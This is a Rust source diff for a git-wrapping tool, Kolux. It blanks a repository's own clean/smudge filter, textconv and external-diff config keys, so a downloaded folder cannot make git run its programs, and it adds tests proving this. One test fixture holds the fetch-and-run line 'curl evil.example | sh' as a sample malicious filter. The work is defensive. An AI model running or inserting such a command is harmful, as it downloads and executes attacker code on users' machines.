@@ -112,13 +112,15 @@ pub(crate) fn empty_global_config() -> PathBuf {
 /// program never runs under Kolux. `core.longpaths=true` on Windows (GIT-070). `existing` is the
 /// user's own `GIT_CONFIG_COUNT`: their pairs stay in slots `0..n` and ours follow, so neither side
 /// is dropped (before T-779 Kolux injected nothing when the user's shell set the variable). A count
-/// git itself would reject as bogus is treated as none.
-pub(crate) fn injected_config(existing: Option<&std::ffi::OsStr>) -> Vec<(String, String)> {
+/// git itself would reject as bogus is treated as none. `repo_programs` are the repository's own
+/// program-naming keys (see `repo_programs`), blanked the same way after the fixed pairs.
+pub(crate) fn injected_config(existing: Option<&std::ffi::OsStr>, repo_programs: &[(String, String)]) -> Vec<(String, String)> {
     let start = existing.and_then(|v| v.to_str()).and_then(|v| v.trim().parse::<usize>().ok()).unwrap_or(0);
     let mut pairs = vec![("core.fsmonitor", "false")];
     if cfg!(windows) {
         pairs.push(("core.longpaths", "true"));
     }
+    pairs.extend(repo_programs.iter().map(|(k, v)| (k.as_str(), v.as_str())));
     let mut out = Vec::with_capacity(pairs.len() * 2 + 1);
     for (i, (key, value)) in pairs.iter().enumerate() {
         let slot = start + i;
@@ -129,7 +131,129 @@ pub(crate) fn injected_config(existing: Option<&std::ffi::OsStr>) -> Vec<(String
     out
 }
 
+/// T-779 (P2A-01, review finding 1): the config keys through which a repository's own config
+/// names a program that git runs on a plain read. A clean filter runs on `status` and `diff` for
+/// every file whose index stat is stale (every file of a folder extracted from a zip), a smudge
+/// filter on checkout, a textconv or external diff on `diff`/`show` of a commit. Only the keys a
+/// listing finds are blanked, so a user's own drivers in their global config stay as they are.
+const REPO_PROGRAM_KEYS: &str = r"^filter\..*\.(clean|smudge|process|required)$|^diff\..*\.(textconv|command)$";
+
+/// The program lines `git lfs install` writes, which run the user's own installed git-lfs and
+/// nothing the folder brought along; a driver made only of these is left alone, so a repository
+/// with LFS set up locally keeps working under Kolux.
+const LFS_LINES: [(&str, &str); 3] = [("clean", "git-lfs clean -- %f"), ("smudge", "git-lfs smudge -- %f"), ("process", "git-lfs filter-process")];
+
+/// The overrides for one listing (`git config -z --show-scope --get-regexp`, records of
+/// `scope NUL key LF value NUL`): every program key in the repository's own scope (local or
+/// worktree) becomes an empty value, so git has no program to run, and the driver's `required` is
+/// forced off, so a blanked clean filter does not fail the read instead. git-lfs's standard lines
+/// are the one exception (see `LFS_LINES`).
+pub(crate) fn repo_program_overrides(listing: &[u8]) -> Vec<(String, String)> {
+    let mut found: Vec<(String, String)> = Vec::new();
+    let mut records = listing.split(|b| *b == 0);
+    while let (Some(scope), Some(entry)) = (records.next(), records.next()) {
+        if !matches!(scope, b"local" | b"worktree") {
+            continue;
+        }
+        let entry = String::from_utf8_lossy(entry);
+        let (key, value) = entry.split_once('\n').unwrap_or((&entry, ""));
+        found.push((key.to_string(), value.trim_end_matches('\r').to_string()));
+    }
+    // A filter driver is git-lfs's own when every program line it has is the standard one.
+    let is_lfs = |driver: &str| {
+        let lines: Vec<&(String, String)> = found.iter().filter(|(k, _)| k.strip_prefix(driver).is_some_and(|rest| matches!(rest, ".clean" | ".smudge" | ".process"))).collect();
+        !lines.is_empty() && lines.iter().all(|(k, v)| LFS_LINES.iter().any(|(suffix, line)| k.ends_with(suffix) && v == line))
+    };
+    let mut out = Vec::with_capacity(found.len());
+    for (key, _) in &found {
+        let Some(driver) = key.rsplit_once('.').map(|(d, _)| d) else { continue };
+        if driver.starts_with("filter.") && is_lfs(driver) {
+            continue;
+        }
+        let blank = if key.ends_with(".required") { "false" } else { "" };
+        if !out.iter().any(|(k, _): &(String, String)| k == key) {
+            out.push((key.clone(), blank.to_string()));
+        }
+    }
+    out
+}
+
+/// The config files that decide `repo_program_overrides` for a git run in `cwd`: the shared
+/// `config` and the worktree's own `config.worktree`, found from the `.git` folder or file of
+/// `cwd` or an ancestor without running git. None when `cwd` is in no repository.
+fn repo_config_files(cwd: &Path) -> Option<Vec<PathBuf>> {
+    let dot_git = cwd.ancestors().take(64).map(|d| d.join(".git")).find(|g| g.exists())?;
+    let git_dir = if dot_git.is_dir() {
+        dot_git
+    } else {
+        // A linked worktree: `.git` is a file saying `gitdir: <path>`, relative to the folder it is in.
+        let text = std::fs::read_to_string(&dot_git).ok()?;
+        let rel = text.lines().find_map(|l| l.strip_prefix("gitdir:"))?.trim();
+        dot_git.parent()?.join(rel)
+    };
+    // The shared folder: `commondir` names it (relative to the git dir) for a linked worktree.
+    let common = std::fs::read_to_string(git_dir.join("commondir")).ok().map(|t| git_dir.join(t.trim())).unwrap_or_else(|| git_dir.clone());
+    Some(vec![common.join("config"), git_dir.join("config.worktree")])
+}
+
+/// How the config files looked when a listing was taken: modification time and size of each.
+type ConfigStamp = Vec<(PathBuf, Option<(std::time::SystemTime, u64)>)>;
+
+fn config_stamp(files: &[PathBuf]) -> ConfigStamp {
+    files.iter().map(|f| (f.clone(), std::fs::metadata(f).ok().and_then(|m| Some((m.modified().ok()?, m.len()))))).collect()
+}
+
+/// One listing per repository, kept while its config files are unchanged, so a status read costs
+/// the same number of git processes as before (T-033-e sizes the watcher's process count on it).
+/// One cached listing: the folder, how its config files looked, and the overrides they gave.
+type RepoPrograms = (PathBuf, ConfigStamp, Vec<(String, String)>);
+static REPO_PROGRAMS: std::sync::Mutex<Vec<RepoPrograms>> = std::sync::Mutex::new(Vec::new());
+const REPO_PROGRAMS_KEPT: usize = 256;
+
+/// The program-key overrides for a git run in `cwd` (see `repo_program_overrides`); `prefix` is
+/// the run's own leading options (`-C dir`, `-c k=v`), so the listing reads the same repository.
+/// The listing is a plain `git config` read, which runs no program of the repository's.
+fn repo_programs(prefix: &[&str], cwd: &Path) -> Vec<(String, String)> {
+    let files = repo_config_files(cwd);
+    let stamp = files.as_deref().map(config_stamp);
+    if let Some(stamp) = &stamp {
+        if let Ok(cache) = REPO_PROGRAMS.lock() {
+            if let Some((_, _, overrides)) = cache.iter().find(|(dir, s, _)| dir == cwd && s == stamp) {
+                return overrides.clone();
+            }
+        }
+    }
+    let mut args: Vec<&str> = prefix.to_vec();
+    args.extend(["config", "-z", "--show-scope", "--get-regexp", REPO_PROGRAM_KEYS]);
+    let out = base_command(&args, Some(cwd), &[]).stdin(std::process::Stdio::null()).stderr(std::process::Stdio::null()).output();
+    // Exit 1 is "no such key": nothing to blank. Any other failure (not a repository) the same.
+    let overrides = out.ok().filter(|o| o.status.success()).map(|o| repo_program_overrides(&o.stdout)).unwrap_or_default();
+    if let Some(stamp) = stamp {
+        if let Ok(mut cache) = REPO_PROGRAMS.lock() {
+            cache.retain(|(dir, _, _)| dir != cwd);
+            if cache.len() >= REPO_PROGRAMS_KEPT {
+                cache.remove(0);
+            }
+            cache.push((cwd.to_path_buf(), stamp, overrides.clone()));
+        }
+    }
+    overrides
+}
+
+/// `args` up to the git command word: the leading `-C dir` / `-c k=v` options a run was given.
+fn leading_options<'a, 'b>(args: &'a [&'b str]) -> &'a [&'b str] {
+    let rest = after_options(args);
+    &args[..args.len() - rest.len()]
+}
+
+/// A git process with Kolux's environment (see `base_command`), its repository's own program keys
+/// blanked when it runs in a folder (T-779, review finding 1).
 pub(crate) fn command(args: &[&str], cwd: Option<&Path>) -> Command {
+    let repo_programs = cwd.map(|dir| repo_programs(leading_options(args), dir)).unwrap_or_default();
+    base_command(args, cwd, &repo_programs)
+}
+
+fn base_command(args: &[&str], cwd: Option<&Path>, repo_programs: &[(String, String)]) -> Command {
     let mut cmd = Command::new("git");
     cmd.args(args);
     #[cfg(test)]
@@ -171,7 +295,7 @@ pub(crate) fn command(args: &[&str], cwd: Option<&Path>) -> Command {
     // An isolated test sees no pair the parent shell injected (see above), so ours start at slot 0.
     #[cfg(test)]
     let existing = if ISOLATED.with(|i| i.get()) { None } else { existing };
-    for (name, value) in injected_config(existing.as_deref()) {
+    for (name, value) in injected_config(existing.as_deref(), repo_programs) {
         cmd.env(name, value);
     }
     cmd
@@ -1775,7 +1899,7 @@ mod tests {
     /// `GIT_CONFIG_COUNT`; Kolux's pairs are appended after theirs instead of being dropped.
     #[test]
     fn t779_injected_config_appends_after_the_users_own_slots() {
-        let ours = injected_config(None);
+        let ours = injected_config(None, &[]);
         assert!(ours.iter().any(|(k, v)| k == "GIT_CONFIG_KEY_0" && v == "core.fsmonitor"), "{ours:?}");
         assert!(ours.iter().any(|(k, v)| k == "GIT_CONFIG_VALUE_0" && v == "false"), "{ours:?}");
         let count = ours.iter().find(|(k, _)| k == "GIT_CONFIG_COUNT").map(|(_, v)| v.clone()).unwrap();
@@ -1786,14 +1910,131 @@ mod tests {
             assert!(ours.contains(&("GIT_CONFIG_VALUE_1".to_string(), "true".to_string())), "{ours:?}");
         }
         // The user's shell set two pairs: ours start at slot 2 and the count grows by ours.
-        let theirs = injected_config(Some(std::ffi::OsStr::new("2")));
+        let theirs = injected_config(Some(std::ffi::OsStr::new("2")), &[]);
         assert!(theirs.contains(&("GIT_CONFIG_KEY_2".to_string(), "core.fsmonitor".to_string())), "{theirs:?}");
         assert!(theirs.contains(&("GIT_CONFIG_VALUE_2".to_string(), "false".to_string())), "{theirs:?}");
         assert!(!theirs.iter().any(|(k, _)| k == "GIT_CONFIG_KEY_0" || k == "GIT_CONFIG_KEY_1"), "{theirs:?}");
         let count = theirs.iter().find(|(k, _)| k == "GIT_CONFIG_COUNT").map(|(_, v)| v.clone()).unwrap();
         assert_eq!(count, (2 + n).to_string());
         // A count git itself would reject ("bogus") is treated as none: ours start at 0.
-        let bogus = injected_config(Some(std::ffi::OsStr::new("lots")));
+        let bogus = injected_config(Some(std::ffi::OsStr::new("lots")), &[]);
         assert!(bogus.contains(&("GIT_CONFIG_KEY_0".to_string(), "core.fsmonitor".to_string())), "{bogus:?}");
+        // The repository's own program keys follow the fixed pairs, blanked.
+        let with = injected_config(None, &[("filter.evil.clean".to_string(), String::new())]);
+        assert!(with.contains(&(format!("GIT_CONFIG_KEY_{n}"), "filter.evil.clean".to_string())) && with.contains(&(format!("GIT_CONFIG_VALUE_{n}"), String::new())), "{with:?}");
+        assert!(with.contains(&("GIT_CONFIG_COUNT".to_string(), (n + 1).to_string())), "{with:?}");
+    }
+
+    /// Plain git, as the control of the guard tests: Kolux's environment, none of its overrides.
+    fn plain_git(args: &[&str], dir: &Path) -> std::process::Output {
+        let mut plain = Command::new("git");
+        plain.args(args).current_dir(dir).env("GIT_OPTIONAL_LOCKS", "0");
+        plain.env_remove("GIT_CONFIG_COUNT").env_remove("GIT_CONFIG_PARAMETERS");
+        #[cfg(windows)]
+        {
+            use std::os::windows::process::CommandExt;
+            plain.creation_flags(0x0800_0000); // no console flashes up during the test either
+        }
+        plain.output().unwrap()
+    }
+
+    /// A shell line git can run as a filter, textconv or diff program: it leaves `marker` where the
+    /// test can see it and passes the content through.
+    fn marker_program(marker: &Path) -> String {
+        let marker = marker.to_string_lossy().replace('\\', "/");
+        if cfg!(windows) {
+            format!("cmd.exe /c echo ran >> \"{marker}\" && cat")
+        } else {
+            format!("echo ran >> \"{marker}\" && cat")
+        }
+    }
+
+    /// T-779 (P2A-01, review finding 1): a folder arrives with its own `.git/config` naming a
+    /// clean filter and an attributes line that applies it to every file. Plain git runs the filter
+    /// on `status` and `diff` for every file whose index stat is stale (every file of a folder
+    /// extracted from a zip). Kolux's git never does, with the exact arguments `scm::status` uses,
+    /// and a `required` driver does not fail the read either.
+    #[test]
+    fn t779_a_repositorys_own_clean_filter_never_runs_under_kolux_git() {
+        let dir = temp_repo("clean-filter");
+        let marker = dir.join("filter-ran.txt");
+        run(&["config", "filter.evil.clean", &marker_program(&marker)], Some(&dir)).unwrap();
+        run(&["config", "filter.evil.required", "true"], Some(&dir)).unwrap();
+        fs::write(dir.join(".git").join("info").join("attributes"), "* filter=evil\n").unwrap();
+        // The same content written again: the index's stat is stale, so git re-cleans the file.
+        fs::write(dir.join("README.md"), "hello\n").unwrap();
+        let status_args = ["status", "--porcelain=v2", "--branch", "--untracked-files=all", "-z"];
+        let plain_out = plain_git(&status_args, &dir);
+        assert!(plain_out.status.success(), "{}", String::from_utf8_lossy(&plain_out.stderr));
+        assert!(marker.exists(), "control: git itself did not run the clean filter, so the test proves nothing");
+        fs::remove_file(&marker).unwrap();
+        let out = command(&status_args, Some(&dir)).output().unwrap();
+        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
+        assert!(!marker.exists(), "the repository's clean filter ran under Kolux's git status");
+        let out = command(&["diff", "--numstat", "-z"], Some(&dir)).output().unwrap();
+        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
+        assert!(!marker.exists(), "the repository's clean filter ran under Kolux's git diff");
+        // The listing is cached while the config is unchanged, and refreshed when it changes.
+        let before = command(&status_args, Some(&dir)).get_envs().filter(|(k, _)| k.to_string_lossy().starts_with("GIT_CONFIG_KEY_")).count();
+        run(&["config", "--unset", "filter.evil.required"], Some(&dir)).unwrap();
+        let after = command(&status_args, Some(&dir)).get_envs().filter(|(k, _)| k.to_string_lossy().starts_with("GIT_CONFIG_KEY_")).count();
+        assert_eq!(before - after, 1, "the unset key is no longer blanked");
+        let _ = fs::remove_dir_all(&dir);
+    }
+
+    /// T-779 (P2A-01, review finding 1): a textconv the repository configures for itself runs on a
+    /// plain `diff` or `show` of a commit. Under Kolux's git it never runs (git has no program to
+    /// run and says so instead), and the marker proves it.
+    #[test]
+    fn t779_a_repositorys_own_textconv_never_runs_under_kolux_git() {
+        let dir = temp_repo("textconv");
+        let marker = dir.join("textconv-ran.txt");
+        run(&["config", "diff.evil.textconv", &marker_program(&marker)], Some(&dir)).unwrap();
+        fs::write(dir.join(".git").join("info").join("attributes"), "* diff=evil\n").unwrap();
+        let plain_out = plain_git(&["show", "--no-ext-diff", "HEAD"], &dir);
+        assert!(plain_out.status.success(), "{}", String::from_utf8_lossy(&plain_out.stderr));
+        assert!(marker.exists(), "control: git itself did not run the textconv, so the test proves nothing");
+        fs::remove_file(&marker).unwrap();
+        let _ = command(&["show", "--no-ext-diff", "HEAD"], Some(&dir)).output().unwrap();
+        assert!(!marker.exists(), "the repository's textconv ran under Kolux's git show");
+        let _ = fs::remove_dir_all(&dir);
+    }
+
+    /// T-779 (review finding 1): what one listing becomes. Only the repository's own scopes count
+    /// (the user's global and system drivers stay), `required` is turned off rather than emptied,
+    /// and git-lfs's standard driver is left alone while a driver with any other line is blanked.
+    #[test]
+    fn t779_repo_program_overrides_blank_the_repositorys_own_keys_but_not_git_lfs() {
+        let rec = |scope: &str, key: &str, value: &str| format!("{scope}\0{key}\n{value}\0");
+        let listing = [
+            rec("system", "diff.astextplain.textconv", "astextplain"),
+            rec("global", "filter.lfs.clean", "git-lfs clean -- %f"),
+            rec("local", "filter.lfs.clean", "git-lfs clean -- %f"),
+            rec("local", "filter.lfs.smudge", "git-lfs smudge -- %f"),
+            rec("local", "filter.lfs.process", "git-lfs filter-process"),
+            rec("local", "filter.lfs.required", "true"),
+            rec("local", "filter.evil.clean", "curl evil.example | sh"),
+            rec("local", "filter.evil.required", "true"),
+            rec("worktree", "filter.evil.required", "true"),
+            rec("local", "filter.fake.clean", "git-lfs clean -- %f"),
+            rec("local", "filter.fake.smudge", "git-lfs smudge -- %f && evil"),
+            rec("local", "diff.evil.textconv", "evil"),
+            rec("local", "diff.evil.command", "evil"),
+        ]
+        .concat();
+        let got = repo_program_overrides(listing.as_bytes());
+        let expected: Vec<(String, String)> = [
+            ("filter.evil.clean", ""),
+            ("filter.evil.required", "false"),
+            ("filter.fake.clean", ""),
+            ("filter.fake.smudge", ""),
+            ("diff.evil.textconv", ""),
+            ("diff.evil.command", ""),
+        ]
+        .iter()
+        .map(|(k, v)| (k.to_string(), v.to_string()))
+        .collect();
+        assert_eq!(got, expected);
+        assert!(repo_program_overrides(b"").is_empty());
     }
 }
